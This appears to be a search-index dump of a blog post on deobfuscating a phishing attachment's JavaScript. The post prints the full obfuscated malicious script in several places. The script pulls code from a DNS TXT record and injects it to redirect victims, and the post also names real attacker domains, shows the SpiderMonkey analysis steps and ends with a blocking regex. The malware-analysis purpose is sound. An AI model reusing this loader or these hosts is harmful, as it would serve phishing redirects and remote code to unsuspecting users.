\"aHR0cHM6Ly9kbnMuZ29vZ2xlLmNvbS9yZXNvbHZlP25hbWU9ZmV0Y2guc2x6eGtjZWUuZ2xhbWlzYm91bmQuY29tJnR5cGU9VFhU\" ); var _0x2b42 = [ '0xc' , 'open' , 'GET' , 'onreadystatechange' , 'status' , 'readyState' , 'parse' , 'responseText' , 'createElement' , 'script' , 'innerHTML' , 'substring' , 'send' , 'push' , 'shift' , '0x0' , '0x1' , '0x2' , '0x3' , '0x4' , '0x5' , '0x6' , '0x7' , 'data' , '0x8' , '0x9' , '0xa' , '0xb' , 'length' , 'body' ]; ( function ( _0x26248d , _0x33adc9 ) { var _0x47fb3a = function ( _0xb8f9b1 ) { while ( -- _0xb8f9b1 ) { _0x26248d [ 'push' ]( _0x26248d [ 'shift' ]()); } }; _0x47fb3a ( ++ _0x33adc9 ); }( _0x2b42 , 0x97 )); var _0x58f7 = function ( _0x3aa2b9 , _0x591490 ) { _0x3aa2b9 = _0x3aa2b9 - 0x0 ; var _0x2886d9 = _0x2b42 [ _0x3aa2b9 ]; return _0x2886d9 ; }; function ccc () { var _0x3bf9f2 = [ _0x58f7 ( '0x0' ), _0x58f7 ( '0x1' ), _0x58f7 ( '0x2' ), _0x58f7 ( '0x3' ), _0x58f7 ( '0x4' ), _0x58f7 ( '0x5' ), _0x58f7 ( '0x6' ), 'Answer' , _0x58f7 ( '0x7' ), _0x58f7 ( '0x8' ), _0x58f7 ( '0x9' ), _0x58f7 ( '0xa' ), 'appendChild' , _0x58f7 ( '0xb' )]; ( function ( _0x532510 , _0x26a9cf ) { var _0x47b474 = function ( _0x5c32a3 ) { while ( -- _0x5c32a3 ) { _0x532510 [ _0x58f7 ( '0xc' )]( _0x532510 [ _0x58f7 ( '0xd' )]()); } }; _0x47b474 ( ++ _0x26a9cf ); }( _0x3bf9f2 , 0x1b2 )); var _0x58060d = function ( _0x13b5d5 , _0x174409 ) { _0x13b5d5 = _0x13b5d5 - 0x0 ; var _0x1aae1c = _0x3bf9f2 [ _0x13b5d5 ]; return _0x1aae1c ; }; var _0x48f014 = new XMLHttpRequest (); _0x48f014 [ _0x58060d ( _0x58f7 ( '0xe' ))]( _0x58060d ( _0x58f7 ( '0xf' )), v ); _0x48f014 [ _0x58060d ( _0x58f7 ( '0x10' ))] = function () { if ( _0x48f014 [ _0x58060d ( _0x58f7 ( '0x11' ))] == 0xc8 && _0x48f014 [ _0x58060d ( _0x58f7 ( '0x12' ))] == 0x4 ) { var _0x45edda = JSON [ _0x58060d ( _0x58f7 ( '0x13' ))]( _0x48f014 [ _0x58060d ( _0x58f7 ( '0x14' ))]); var _0x2e08f9 = _0x45edda [ _0x58060d ( _0x58f7 ( '0x15' ))][ 0x0 ][ _0x58f7 ( '0x16' )]; var _0x599d3c = document [ _0x58060d ( _0x58f7 ( '0x17' ))]( _0x58060d ( _0x58f7 ( '0x18' ))); _0x599d3c [ _0x58060d ( _0x58f7 ( '0x19' ))] = _0x2e08f9 [ _0x58060d ( _0x58f7 ( '0x1a' ))]( 0x1 , _0x2e08f9 [ _0x58f7 ( '0x1b' )] - 0x1 ); document [ _0x58f7 ( '0x1c' )][ _0x58060d ( _0x58f7 ( '0x1d' ))]( _0x599d3c ); } }; _0x48f014 [ _0x58060d ( '0xd' )](); } Carefully save this script to a new malicious.js file on the sandbox for later. The following lines jump out after a quick review: Line 1 contains a BASE64 string Line 2 an array of functions that are likely called in the code Line 32 XMLHttpRequest Using CyberChef Line 1 is decoded to: https://dns.google.com/resolve?name=fetch.slzxkcee.glamisbound.com&type=TXT This is a URL for google's DNS lookup service. More specifically it is doing a lookup for a TXT DNS record for subdomain fetch.slzxkcee.glamisbound.com. Doing this lookup from the sandbox returns the following JSON response: { \"Status\" : 0 , \"TC\" : false , \"RD\" : true , \"RA\" : true , \"AD\" : false , \"CD\" : false , \"Question\" :[ { \"name\" : \"fetch.slzxkcee.glamisbound.com.\" , \"type\" : 16 }], \"Answer\" :[ { \"name\" : \"fetch.slzxkcee.glamisbound.com.\" , \"type\" : 16 , \"TTL\" : 119 , \"data\" : \"\\\"window.location.replace(\\\"http://www.67595bfg36abp.multiproinvest.com/80999.html\\\");\\\"\" }], \"Comment\" : \"Response from 104.193.252.177.\" } Each time this lookup is done, the server responds with a different answer which contains a different URL. The TTL is set to 119 seconds, which means the DNS servers will only cache the request for under 2 min. The data field contains JavaScript code and a URL. Lets see what the Javascript code does [5]: The Location.replace() method replaces the current resource with the one at the provided URL. The difference from the assign() method is that after using replace() the current page will not be saved in session History, meaning the user won't be able to use the back button to navigate to it. At this point we can make an educated guess what the original malicious attachment is doing. It's probably doing a DNS TXT lookup to obtain the second malicious domain. It then redirects the user to this domain. However, to be sure we need to deobfuscate rest of the script. Lets continue... JavaScript Deobfuscation \u00b6 One of my favorite tools for JS deobfuscation is SpiderMonkey by Didier Stevens. Here is what it does [6]: SpiderMonkey is a modified version of Mozilla\u2019s C implementation of JavaScript, with some extra functions to help with malware analysis. Additional functionality: document.write eval(arg) writes arg to a file window.navigate We're going to use document.write and SpiderMonkey to deobfuscate this script. Going back to the original attaachment, Line 9 is shown here: <script src=\"https://accounts.google.com/o/oauth2/revoke?callback=ccc()\" type=\"text/javascript\" xml:space=\"preserve\"></script> This line is a tricky way to call the ccc() function in the malicious.js. We will need to call ccc() to simulate the original attachment. This can be done but adding ccc() to the bottom of malicious.js. Lets run the script in the sandbox with SpiderMonkey. Here is the error message I received. PS C:\\Users\\User\\desktop\\windows > .\\js-file .\\malicious.js .\\malicious.js:1: TypeError: window.atob is not a function You will see errors like this with SpiderMonkey. As we're not running the JavaScript in a browser, we need to modify the code a little bit. Here is what windows.atob does [7]: Decode a base-64 encoded string Lets replace line 1 of .\\malicious.js with the decoded value of the string. var v = \"https://dns.google.com/resolve?name=fetch.slzxkcee.glamisbound.com&type=TXT\" ; Running the script again gives an error message about \"XMLHttpRequest\". This is fine, we know that most of the script is running now. There are no output or write.log to know what this script does. Beware at this point your VM may be infected. Depending on what you're analyzing and whether the sandbox is connected to the internet or not, you may want to restart your Sandbox (from a clean snapshot). Lets add some document.write to the script to figure out what the script is doing. By adding these document.write and using SpiderMonkey, we can dump the obfuscated strings to 'write.log' file. Using this method, we will be able to deobfuscate the script. Here is some of the document.write that I added to the script (more specifically prior to the \"XMLHttpRequest()\" function): document . write ( \"XMLHttpRequest => \" + _0x58060d ( _0x58f7 ( '0xe' )) + \" \" + ( _0x58060d ( _0x58f7 ( '0xf' ))) + \" \" + v + \" \" + \"\\n\" ); document . write ( \"_0x58060d(_0x58f7('0x10')): \" + _0x58060d ( _0x58f7 ( '0x10' )) + \"\\n\" ); document . write ( \"_0x58060d(_0x58f7('0x11')): \" + _0x58060d ( _0x58f7 ( '0x11' )) + \"\\n\" ); document . write ( \"_0x58060d(_0x58f7('0x12')): \" + _0x58060d ( _0x58f7 ( '0x12' )) + \"\\n\" ); document . write ( \"_0x58060d(_0x58f7('0x13')): \" + _0x58060d ( _0x58f7 ( '0x13' )) + \"\\n\" ); document . write ( \"_0x58060d(_0x58f7('0x14')): \" + _0x58060d ( _0x58f7 ( '0x14' )) + \"\\n\" ); document . write ( \"_0x58060d(_0x58f7('0x15')): \" + _0x58060d ( _0x58f7 ( '0x15' )) + \"\\n\" ); document . write ( \"_0x58f7('0x16')): \" + ( _0x58f7 ( '0x16' )) + \"\\n\" ); document . write ( \"_0x58060d(_0x58f7('0x17)): \" + _0x58060d ( _0x58f7 ( '0x17' )) + \"\\n\" ); document . write ( \"_0x58060d(_0x58f7('0x18')): \" + _0x58060d ( _0x58f7 ( '0x18' )) + \"\\n\" ); document . write ( \"_0x58060d(_0x58f7('0x19')): \" + _0x58060d ( _0x58f7 ( '0x19' )) + \"\\n\" ); document . write ( \"_0x58060d(_0x58f7('0x1a')): \" + _0x58060d ( _0x58f7 ( '0x1a' )) + \"\\n\" ); document . write ( \"_0x58f7('0x1b'): \" + _0x58f7 ( '0x1b' ) + \"\\n\" ); document . write ( \"_0x58f7('0x1c'): \" + _0x58f7 ( '0x1c' ) + \"\\n\" ); document . write ( \"_0x58060d(_0x58f7('0x1d')): \" + _0x58060d ( _0x58f7 ( '0x1d' )) + \"\\n\" ); document . write ( \"_0x58060d('0xd'): \" + _0x58060d ( '0xd' ) ); Here is the partial content of write.log after running the script with SpiderMonkey: XMLHttpRequest => open GET https://dns.google.com/resolve?name=fetch.slzxkcee.glamisbound.com&type=TXT _0x58f7: Input: 16,undefined, output:0x2 _0x58060d: Input: 2,undefined, output:onreadystatechange _0x58060d(_0x58f7('0x10')): onreadystatechange _0x58f7: Input: 17,undefined, output:0x3 _0x58060d: Input: 3,undefined, output:status _0x58060d(_0x58f7('0x11')): status _0x58f7: Input: 18,undefined, output:0x4 _0x58060d: Input: 4,undefined, output:readyState _0x58060d(_0x58f7('0x12')): readyState _0x58f7: Input: 19,undefined, output:0x5 _0x58060d: Input: 5,undefined, output:parse _0x58060d(_0x58f7('0x13')): parse _0x58f7: Input: 20,undefined, output:0x6 _0x58060d: Input: 6,undefined, output:responseText _0x58060d(_0x58f7('0x14')): responseText _0x58f7: Input: 21,undefined, output:0x7 _0x58060d: Input: 7,undefined, output:Answer _0x58060d(_0x58f7('0x15')): Answer _0x58f7: Input: 22,undefined, output:data _0x58f7('0x16')): data _0x58f7: Input: 23,undefined, output:0x8 _0x58060d: Input: 8,undefined, output:createElement _0x58060d(_0x58f7('0x17)): createElement _0x58f7: Input: 24,undefined, output:0x9 _0x58060d: Input: 9,undefined, output:script _0x58060d(_0x58f7('0x18')): script _0x58f7: Input: 25,undefined, output:0xa _0x58060d: Input: 10,undefined, output:innerHTML _0x58060d(_0x58f7('0x19')): innerHTML _0x58f7: Input: 26,undefined, output:0xb _0x58060d: Input: 11,undefined, output:substring _0x58060d(_0x58f7('0x1a')): substring _0x58f7: Input: 27,undefined, output:length _0x58f7('0x1b'): length _0x58f7: Input: 28,undefined, output:body _0x58f7('0x1c'): c _0x58f7: Input: 29,undefined, output:0xc _0x58060d: Input: 12,undefined, output:appendChild _0x58060d(_0x58f7('0x1d')): appendChild _0x58060d: Input: 13,undefined, output:send _0x58060d('0xd'): send Replacing the obfuscated strings with the deobfuscate strings and renaming the variables gives the following: var XMLHTTP = new XMLHttpRequest (); XMLHTTP [ Open ]( Get ), \"https://dns.google.com/resolve?name=fetch.slzxkcee.glamisbound.com&type=TXT\" ; XMLHTTP [ onreadystatechange ] = function () { if ( XMLHTTP [ status ] == 0xc8 && XMLHTTP [ readyState ] == 0x4 ) { var responseTextString = JSON [ parse ]( XMLHTTP [ responseText ]); var dataString = responseTextString [ Answer ][ 0x0 ][ data ]; var HTMLDocument = document [ createElement ]( script ); HTMLDocument [ innerHTML ] = dataString [ substring ]( 0x1 , dataString [ length ] - 0x1 ); document [ length ][ appendChild ]( HTMLDocument ); } }; XMLHTTP [ send ](); This verifies our educated guess from earlier. Blocking the Script \u00b6 There are different ways to block the script. One way is to block the initial DNS lookup. Another way is to block the second domain. I looked at number of the DNS TXT responses and at the moment there seems to be a pattern in the responses. The second domain can be blocked by a web proxy, using the following Regex: \\d{5}bfg36abp\\..*\\.\\w{3}\\/\\d{5}\\.html\\\\ Conclusion \u00b6 This article described how you can deobfucate a malicious JavaScript code. The malware authors could have done better hiding the DNS lookup. They used a simple BASE64 encoding to hide the lookup. It's always enjoyable to deobfucate a script to see how it works. If you have any comments/feedback, send them to me via twitter. References \u00b6 https://myonlinesecurity.co.uk/it-looks-like-another-dns-compromise-hack-happening/ https://www.bleepingcomputer.com/news/security/new-spam-campaign-controlled-by-attackers-via-dns-txt-records/ https://stackoverflow.com/questions/51464972/xmlspace-preserve-effect-on-space-between-xml-attributes https://www.tutorialspoint.com/xml/xml_cdata_sections.htm https://developer.mozilla.org/en-US/docs/Web/API/Location/replace SpiderMonkey https://www.w3schools.com/jsref/met_win_atob.asp","title":"How to Deobfuscate JavaScript"},{"location":"posts/2019/post3/2019-06-16-HowToDeobfuscateJS/#introduction","text":"Recently I came across an interesting phishing email. The email contained a XML HTML attachment. The HTML attachment contained a XML header with HTML markup and obfuscated JavaScript(JS) code. Figure 2 shows the phishing email 2 . Figure 2 - A Phishing Email with HTML Attachment Figure 3 shows the code contained in the attachment. Figure 3 - XML HTML File with Malicious JavaScript In this article we're going to analysis the HTML attachment.","title":"Introduction"},{"location":"posts/2019/post3/2019-06-16-HowToDeobfuscateJS/#instructions","text":"Lets get started. We're going to take a part the HTML attachment to see what each part does. We'll need some tools to do this.","title":"Instructions"},{"location":"posts/2019/post3/2019-06-16-HowToDeobfuscateJS/#required-tools","text":"Here are the tools you need: A Sandbox Lab (if you don't have one, then build one ) Didier Stevens's SpiderMonkey ( Link ) Upload the HTML attachment to your sandbox (Be Very Careful!). You can get a copy here (Usual Password) To reduce the risk of accidental double clicking on the malicious attachments you can do the following: Re-associate .html extensions to open in notepad or your favorite hex editor. This will reduce the chance of accidentally double clicking a malicious file while trying to transfer it to your sandbox. Why stop there? Re-associate other high risk extensions (ex. .doc, .xls, .pdf, .vbs, .js) to open in Notepad too. I may revisit this idea in another article.","title":"Required Tools"},{"location":"posts/2019/post3/2019-06-16-HowToDeobfuscateJS/#lets-get-started","text":"Here is the code contained in the malicious HTML attachment: <?xml version=\"1.0\" encoding=\"utf-8\"?> <!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"> <html xmlns= \"http://www.w3.org/1999/xhtml\" > <head> <meta content= \"\" /><script type= \"text/javascript\" xml:space= \"preserve\" > // <![CDATA[ var v = window.atob(\"aHR0cHM6Ly9kbnMuZ29vZ2xlLmNvbS9yZXNvbHZlP25hbWU9ZmV0Y2guc2x6eGtjZWUuZ2xhbWlzYm91bmQuY29tJnR5cGU9VFhU\"); var _0x2b42=['0xc','open','GET','onreadystatechange','status','readyState','parse','responseText','createElement','script','innerHTML','substring','send','push','shift','0x0','0x1','0x2','0x3','0x4','0x5','0x6','0x7','data','0x8','0x9','0xa','0xb','length','body'];(function(_0x26248d,_0x33adc9){var _0x47fb3a=function(_0xb8f9b1){while(--_0xb8f9b1){_0x26248d['push'](_0x26248d['shift']());}};_0x47fb3a(++_0x33adc9);}(_0x2b42,0x97));var _0x58f7=function(_0x3aa2b9,_0x591490){_0x3aa2b9=_0x3aa2b9-0x0;var _0x2886d9=_0x2b42[_0x3aa2b9];return _0x2886d9;};function ccc(){var _0x3bf9f2=[_0x58f7('0x0'),_0x58f7('0x1'),_0x58f7('0x2'),_0x58f7('0x3'),_0x58f7('0x4'),_0x58f7('0x5'),_0x58f7('0x6'),'Answer',_0x58f7('0x7'),_0x58f7('0x8'),_0x58f7('0x9'),_0x58f7('0xa'),'appendChild',_0x58f7('0xb')];(function(_0x532510,_0x26a9cf){var _0x47b474=function(_0x5c32a3){while(--_0x5c32a3){_0x532510[_0x58f7('0xc')](_0x532510[_0x58f7('0xd')]());}};_0x47b474(++_0x26a9cf);}(_0x3bf9f2,0x1b2));var _0x58060d=function(_0x13b5d5,_0x174409){_0x13b5d5=_0x13b5d5-0x0;var _0x1aae1c=_0x3bf9f2[_0x13b5d5];return _0x1aae1c;};var _0x48f014=new XMLHttpRequest();_0x48f014[_0x58060d(_0x58f7('0xe'))](_0x58060d(_0x58f7('0xf')),v);_0x48f014[_0x58060d(_0x58f7('0x10'))]=function(){if(_0x48f014[_0x58060d(_0x58f7('0x11'))]==0xc8&&_0x48f014[_0x58060d(_0x58f7('0x12'))]==0x4){var _0x45edda=JSON[_0x58060d(_0x58f7('0x13'))](_0x48f014[_0x58060d(_0x58f7('0x14'))]);var _0x2e08f9=_0x45edda[_0x58060d(_0x58f7('0x15'))][0x0][_0x58f7('0x16')];var _0x599d3c=document[_0x58060d(_0x58f7('0x17'))](_0x58060d(_0x58f7('0x18')));_0x599d3c[_0x58060d(_0x58f7('0x19'))]=_0x2e08f9[_0x58060d(_0x58f7('0x1a'))](0x1,_0x2e08f9[_0x58f7('0x1b')]-0x1);document[_0x58f7('0x1c')][_0x58060d(_0x58f7('0x1d'))](_0x599d3c);}};_0x48f014[_0x58060d('0xd')]();} //]]> </script><script src= \"https://accounts.google.com/o/oauth2/revoke?callback=ccc()\" type= \"text/javascript\" xml:space= \"preserve\" ></script> <title></title> </head> <body> Loading... </body> </html> Here are some of the things that stand out : Line 1 is the XML header Line 2 is defining an HTML XML Document Line 3 start of the HTML document Line 5 script tag containing JavaScript Line 5 also contains interesting code - xml:space=\"preserve\">//<![CDATA[ Line 6-7 JS code Line 8 interesting end for a JavaScript - //]]> Line 9 end of first script and started of second script Line 12-14 the HTML body that shows the message \"Loading...\" Line 15 end of the html - There are two script blocks in the attachment. The first script block starts on Line 5 and it contains JavaScript code. Line 5 contains some interesting code: xml:space=\"preserve\">//<![CDATA[ The first part xml:space=\"preserve\"> is at the end of the HTML script tag. Here is what it means 3 : The xml:space=\"preserve\" directive says that space within element content is significant. It's basically a XML parser instruction that specifies space is important. The second part //<![CDATA[ is the start of the JavaScript code. In JavaScript // denotes a comment. Here is what <![CDATA[ means in XML [4]: The term CDATA means, Character Data. CDATA is defined as blocks of text that are not parsed by the parser, but are otherwise recognized as markup. ... Following is the syntax for CDATA section \u2212 <![CDATA[ characters with markup ]]> The above also explains Line 8 of the attachment file. ]]> means it's the end of the CDATA section. This leaves line 6 and 7 that is the actual obfuscated JS code. Lets take a closer look. First, lets see if we can make the code more readable using a JS beautifier. There are many different websites online that provide this service. On our sandbox, using the one here we beautify line 6 and 7. Here is resulting code: var v = window . atob ( \"aHR0cHM6Ly9kbnMuZ29vZ2xlLmNvbS9yZXNvbHZlP25hbWU9ZmV0Y2guc2x6eGtjZWUuZ2xhbWlzYm91bmQuY29tJnR5cGU9VFhU\" ); var _0x2b42 = [ '0xc' , 'open' , 'GET' , 'onreadystatechange' , 'status' , 'readyState' , 'parse' , 'responseText' , 'createElement' , 'script' , 'innerHTML' , 'substring' , 'send' , 'push' , 'shift' , '0x0' , '0x1' , '0x2' , '0x3' , '0x4' , '0x5' , '0x6' , '0x7' , 'data' , '0x8' , '0x9' , '0xa' , '0xb' , 'length' , 'body' ]; ( function ( _0x26248d , _0x33adc9 ) { var _0x47fb3a = function ( _0xb8f9b1 ) { while ( -- _0xb8f9b1 ) { _0x26248d [ 'push' ]( _0x26248d [ 'shift' ]()); } }; _0x47fb3a ( ++ _0x33adc9 ); }( _0x2b42 , 0x97 )); var _0x58f7 = function ( _0x3aa2b9 , _0x591490 ) { _0x3aa2b9 = _0x3aa2b9 - 0x0 ; var _0x2886d9 = _0x2b42 [ _0x3aa2b9 ]; return _0x2886d9 ; }; function ccc () { var _0x3bf9f2 = [ _0x58f7 ( '0x0' ), _0x58f7 ( '0x1' ), _0x58f7 ( '0x2' ), _0x58f7 ( '0x3' ), _0x58f7 ( '0x4' ), _0x58f7 ( '0x5' ), _0x58f7 ( '0x6' ), 'Answer' , _0x58f7 ( '0x7' ), _0x58f7 ( '0x8' ), _0x58f7 ( '0x9' ), _0x58f7 ( '0xa' ), 'appendChild' , _0x58f7 ( '0xb' )]; ( function ( _0x532510 , _0x26a9cf ) { var _0x47b474 = function ( _0x5c32a3 ) { while ( -- _0x5c32a3 ) { _0x532510 [ _0x58f7 ( '0xc' )]( _0x532510 [ _0x58f7 ( '0xd' )]()); } }; _0x47b474 ( ++ _0x26a9cf ); }( _0x3bf9f2 , 0x1b2 )); var _0x58060d = function ( _0x13b5d5 , _0x174409 ) { _0x13b5d5 = _0x13b5d5 - 0x0 ; var _0x1aae1c = _0x3bf9f2 [ _0x13b5d5 ]; return _0x1aae1c ; }; var _0x48f014 = new XMLHttpRequest (); _0x48f014 [ _0x58060d ( _0x58f7 ( '0xe' ))]( _0x58060d ( _0x58f7 ( '0xf' )), v ); _0x48f014 [ _0x58060d ( _0x58f7 ( '0x10' ))] = function () { if ( _0x48f014 [ _0x58060d ( _0x58f7 ( '0x11' ))] == 0xc8 && _0x48f014 [ _0x58060d ( _0x58f7 ( '0x12' ))] == 0x4 ) { var _0x45edda = JSON [ _0x58060d ( _0x58f7 ( '0x13' ))]( _0x48f014 [ _0x58060d ( _0x58f7 ( '0x14' ))]); var _0x2e08f9 = _0x45edda [ _0x58060d ( _0x58f7 ( '0x15' ))][ 0x0 ][ _0x58f7 ( '0x16' )]; var _0x599d3c = document [ _0x58060d ( _0x58f7 ( '0x17' ))]( _0x58060d ( _0x58f7 ( '0x18' ))); _0x599d3c [ _0x58060d ( _0x58f7 ( '0x19' ))] = _0x2e08f9 [ _0x58060d ( _0x58f7 ( '0x1a' ))]( 0x1 , _0x2e08f9 [ _0x58f7 ( '0x1b' )] - 0x1 ); document [ _0x58f7 ( '0x1c' )][ _0x58060d ( _0x58f7 ( '0x1d' ))]( _0x599d3c ); } }; _0x48f014 [ _0x58060d ( '0xd' )](); } Carefully save this script to a new malicious.js file on the sandbox for later. The following lines jump out after a quick review: Line 1 contains a BASE64 string Line 2 an array of functions that are likely called in the code Line 32 XMLHttpRequest Using CyberChef Line 1 is decoded to: https://dns.google.com/resolve?name=fetch.slzxkcee.glamisbound.com&type=TXT This is a URL for google's DNS lookup service. More specifically it is doing a lookup for a TXT DNS record for subdomain fetch.slzxkcee.glamisbound.com. Doing this lookup from the sandbox returns the following JSON response: { \"Status\" : 0 , \"TC\" : false , \"RD\" : true , \"RA\" : true , \"AD\" : false , \"CD\" : false , \"Question\" :[ { \"name\" : \"fetch.slzxkcee.glamisbound.com.\" , \"type\" : 16 }], \"Answer\" :[ { \"name\" : \"fetch.slzxkcee.glamisbound.com.\" , \"type\" : 16 , \"TTL\" : 119 , \"data\" : \"\\\"window.location.replace(\\\"http://www.67595bfg36abp.multiproinvest.com/80999.html\\\");\\\"\" }], \"Comment\" : \"Response from 104.193.252.177.\" } Each time this lookup is done, the server responds with a different answer which contains a different URL. The TTL is set to 119 seconds, which means the DNS servers will only cache the request for under 2 min. The data field contains JavaScript code and a URL. Lets see what the Javascript code does [5]: The Location.replace() method replaces the current resource with the one at the provided URL. The difference from the assign() method is that after using replace() the current page will not be saved in session History, meaning the user won't be able to use the back button to navigate to it. At this point we can make an educated guess what the original malicious attachment is doing. It's probably doing a DNS TXT lookup to obtain the second malicious domain. It then redirects the user to this domain. However, to be sure we need to deobfuscate rest of the script. Lets continue...","title":"Lets Get Started"},{"location":"posts/2019/post3/2019-06-16-HowToDeobfuscateJS/#javascript-deobfuscation","text":"One of my favorite tools for JS deobfuscation is SpiderMonkey by Didier Stevens. Here is what it does [6]: SpiderMonkey is a modified version of Mozilla\u2019s C implementation of JavaScript, with some extra functions to help with malware analysis. Additional functionality: document.write eval(arg) writes arg to a file window.navigate We're going to use document.write and SpiderMonkey to deobfuscate this script. Going back to the original attaachment, Line 9 is shown here: <script src=\"https://accounts.google.com/o/oauth2/revoke?callback=ccc()\" type=\"text/javascript\" xml:space=\"preserve\"></script> This line is a tricky way to call the ccc() function in the malicious.js. We will need to call ccc() to simulate the original attachment. This can be done but adding ccc() to the bottom of malicious.js. Lets run the script in the sandbox with SpiderMonkey. Here is the error message I received. PS C:\\Users\\User\\desktop\\windows > .\\js-file .\\malicious.js .\\malicious.js:1: TypeError: window.atob is not a function You will see errors like this with SpiderMonkey. As we're not running the JavaScript in a browser, we need to modify the code a little bit. Here is what windows.atob does [7]: Decode a base-64 encoded string Lets replace line 1 of .\\malicious.js with the decoded value of the string. var v = \"https://dns.google.com/resolve?name=fetch.slzxkcee.glamisbound.com&type=TXT\" ; Running the script again gives an error message about \"XMLHttpRequest\". This is fine, we know that most of the script is running now. There are no output or write.log to know what this script does. Beware at this point your VM may be infected. Depending on what you're analyzing and whether the sandbox is connected to the internet or not, you may want to restart your Sandbox (from a clean snapshot). Lets add some document.write to the script to figure out what the script is doing. By adding these document.write and using SpiderMonkey, we can dump the obfuscated strings to 'write.log' file. Using this method, we will be able to deobfuscate the script. Here is some of the document.write that I added to the script (more specifically prior to the \"XMLHttpRequest()\" function): document . write ( \"XMLHttpRequest => \" + _0x58060d ( _0x58f7 ( '0xe' )) + \" \" + ( _0x58060d ( _0x58f7 ( '0xf' ))) + \" \" + v + \" \" + \"\\n\" ); document . write ( \"_0x58060d(_0x58f7('0x10')): \" + _0x58060d ( _0x58f7 ( '0x10' )) + \"\\n\" ); document . write ( \"_0x58060d(_0x58f7('0x11')): \" + _0x58060d ( _0x58f7 ( '0x11' )) + \"\\n\" ); document . write ( \"_0x58060d(_0x58f7('0x12')): \" + _0x58060d ( _0x58f7 ( '0x12' )) + \"\\n\" ); document . write ( \"_0x58060d(_0x58f7('0x13')): \" + _0x58060d ( _0x58f7 ( '0x13' )) + \"\\n\" ); document . write ( \"_0x58060d(_0x58f7('0x14')): \" + _0x58060d ( _0x58f7 ( '0x14' )) + \"\\n\" ); document . write ( \"_0x58060d(_0x58f7('0x15')): \" + _0x58060d ( _0x58f7 ( '0x15' )) + \"\\n\" ); document . write ( \"_0x58f7('0x16')): \" + ( _0x58f7 ( '0x16' )) + \"\\n\" ); document . write ( \"_0x58060d(_0x58f7('0x17)): \" + _0x58060d ( _0x58f7 ( '0x17' )) + \"\\n\" ); document . write ( \"_0x58060d(_0x58f7('0x18')): \" + _0x58060d ( _0x58f7 ( '0x18' )) + \"\\n\" ); document . write ( \"_0x58060d(_0x58f7('0x19')): \" + _0x58060d ( _0x58f7 ( '0x19' )) + \"\\n\" ); document . write ( \"_0x58060d(_0x58f7('0x1a')): \" + _0x58060d ( _0x58f7 ( '0x1a' )) + \"\\n\" ); document . write ( \"_0x58f7('0x1b'): \" + _0x58f7 ( '0x1b' ) + \"\\n\" ); document . write ( \"_0x58f7('0x1c'): \" + _0x58f7 ( '0x1c' ) + \"\\n\" ); document . write ( \"_0x58060d(_0x58f7('0x1d')): \" + _0x58060d ( _0x58f7 ( '0x1d' )) + \"\\n\" ); document . write ( \"_0x58060d('0xd'): \" + _0x58060d ( '0xd' ) ); Here is the partial content of write.log after running the script with SpiderMonkey: XMLHttpRequest => open GET https://dns.google.com/resolve?name=fetch.slzxkcee.glamisbound.com&type=TXT _0x58f7: Input: 16,undefined, output:0x2 _0x58060d: Input: 2,undefined, output:onreadystatechange _0x58060d(_0x58f7('0x10')): onreadystatechange _0x58f7: Input: 17,undefined, output:0x3 _0x58060d: Input: 3,undefined, output:status _0x58060d(_0x58f7('0x11')): status _0x58f7: Input: 18,undefined, output:0x4 _0x58060d: Input: 4,undefined, output:readyState _0x58060d(_0x58f7('0x12')): readyState _0x58f7: Input: 19,undefined, output:0x5 _0x58060d: Input: 5,undefined, output:parse _0x58060d(_0x58f7('0x13')): parse _0x58f7: Input: 20,undefined, output:0x6 _0x58060d: Input: 6,undefined, output:responseText _0x58060d(_0x58f7('0x14')): responseText _0x58f7: Input: 21,undefined, output:0x7 _0x58060d: Input: 7,undefined, output:Answer _0x58060d(_0x58f7('0x15')): Answer _0x58f7: Input: 22,undefined, output:data _0x58f7('0x16')): data _0x58f7: Input: 23,undefined, output:0x8 _0x58060d: Input: 8,undefined, output:createElement _0x58060d(_0x58f7('0x17)): createElement _0x58f7: Input: 24,undefined, output:0x9 _0x58060d: Input: 9,undefined, output:script _0x58060d(_0x58f7('0x18')): script _0x58f7: Input: 25,undefined, output:0xa _0x58060d: Input: 10,undefined, output:innerHTML _0x58060d(_0x58f7('0x19')): innerHTML _0x58f7: Input: 26,undefined, output:0xb _0x58060d: Input: 11,undefined, output:substring _0x58060d(_0x58f7('0x1a')): substring _0x58f7: Input: 27,undefined, output:length _0x58f7('0x1b'): length _0x58f7: Input: 28,undefined, output:body _0x58f7('0x1c'): c _0x58f7: Input: 29,undefined, output:0xc _0x58060d: Input: 12,undefined, output:appendChild _0x58060d(_0x58f7('0x1d')): appendChild _0x58060d: Input: 13,undefined, output:send _0x58060d('0xd'): send Replacing the obfuscated strings with the deobfuscate strings and renaming the variables gives the following: var XMLHTTP = new XMLHttpRequest (); XMLHTTP [ Open ]( Get ), \"https://dns.google.com/resolve?name=fetch.slzxkcee.glamisbound.com&type=TXT\" ; XMLHTTP [ onreadystatechange ] = function () { if ( XMLHTTP [ status ] == 0xc8 && XMLHTTP [ readyState ] == 0x4 ) { var responseTextString = JSON [ parse ]( XMLHTTP [ responseText ]); var dataString = responseTextString [ Answer ][ 0x0 ][ data ]; var HTMLDocument = document [ createElement ]( script ); HTMLDocument [ innerHTML ] = dataString [ substring ]( 0x1 , dataString [ length ] - 0x1 ); document [ length ][ appendChild ]( HTMLDocument ); } }; XMLHTTP [ send ](); This verifies our educated guess from earlier.","title":"JavaScript Deobfuscation"},{"location":"posts/2019/post3/2019-06-16-HowToDeobfuscateJS/#blocking-the-script","text":"There are different ways to block the script. One way is to block the initial DNS lookup. Another way is to block the second domain. I looked at number of the DNS TXT responses and at the moment there seems to be a pattern in the responses. The second domain can be blocked by a web proxy, using the following Regex: \\d{5}bfg36abp\\..*\\.\\w{3}\\/\\d{5}\\.html\\\\","title":"Blocking the Script"},{"location":"posts/2019/post3/2019-06-16-HowToDeobfuscateJS/#conclusion","text":"This article described how you can deobfucate a malicious JavaScript code. The malware authors could have done better hiding the DNS lookup. They used a simple BASE64 encoding to hide the lookup. It's always enjoyable to deobfucate a script to see how it works. If you have any comments/feedback, send them to me via twitter.","title":"Conclusion"},{"location":"posts/2019/post3/2019-06-16-HowToDeobfuscateJS/#references","text":"https://myonlinesecurity.co.uk/it-looks-like-another-dns-compromise-hack-happening/ https://www.bleepingcomputer.com/news/security/new-spam-campaign-controlled-by-attackers-via-dns-txt-records/ https://stackoverflow.com/questions/51464972/xmlspace-preserve-effect-on-space-between-xml-attributes https://www.tutorialspoint.com/xml/xml_cdata_sections.htm 